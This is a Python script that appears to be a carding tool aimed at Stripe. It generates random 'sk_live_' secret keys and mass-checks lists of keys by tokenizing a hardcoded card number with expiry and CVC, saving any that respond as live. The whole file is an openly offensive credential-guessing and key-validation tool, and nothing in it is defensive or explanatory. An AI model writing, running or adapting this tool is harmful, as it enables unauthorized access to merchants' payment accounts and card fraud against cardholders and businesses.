import stripe,random,string,colorama,termcolor,time,os
colorama.init()
os.system('clear')
def logo():
	print(termcolor.colored('''
	      ╔══╦╦╗╔══╦═╦═╦╗╔══╗
              ╠╗╚╣═╣╚╗╔╣║║║║╚╬╗╚╣
              ╚══╩╩╝─╚╝╚═╩═╩═╩══╝

				
				''',color = 'magenta'))
logo()
print(termcolor.colored('1',color = 'green'),end = "      -      GENERATE SHORT SK\n")
print(termcolor.colored('2',color = 'green'),end = "      -      MASS SK CHECKER\n")
print(termcolor.colored('X',color = 'green'),end = "      -      EXIT\n")
otp = input('\n  > ')
def generator():
	os.system('clear')
	logo()
	many = input("\nEnter The Number Of Sk Keys To Be Generated = ")
	count = 0
	def id_generator(size=24, chars=string.ascii_letters + string.digits):
	    axel = ''.join(random.choice(chars) for _ in range(size))
	    laast = 'sk_live_' + axel
	    return laast
	f = open('Sk_Generated.txt','a')
	print('\n')
	for i in range(int(many)):
	    count += 1
	    keys = id_generator()
	    f.write(f'{keys}\n')
	    print(termcolor.colored(f'{keys}',color = 'cyan'))
	print(termcolor.colored(f'\n{many} SK KEYS WERE GENERATED SUCCESSFULLY!',color = 'green'))
if otp == "1": generator()
def checker():
	os.system('clear')
	logo()
	where = open(input('Enter Sk Keys File Path = ')).readlines()
	for line in where:
		line = line.replace('\n','')
		stripe.api_key = line
		try:
			bawandar = stripe.Token.create(
			card={
		     "number": "4270960002013126",
		     "exp_month": 3,
		     "exp_year": 2023,
		     "cvc": "948",
		   },
		 )
			chm = str(bawandar).split('"livemode":')[1]
			chm = chm.split(',\n')[0]
			if "true" in chm:
				print(termcolor.colored(f'{line}      |      LIVE <\>',color = 'green'))
				w = open('Lives.txt','a').write(f'{line}\n')
		except:
		 print(termcolor.colored(f'{line}      |      DEAD ×',color = 'red'))
		 continue
if otp == '2': checker()
elif otp == 'X': exit()
else: exit()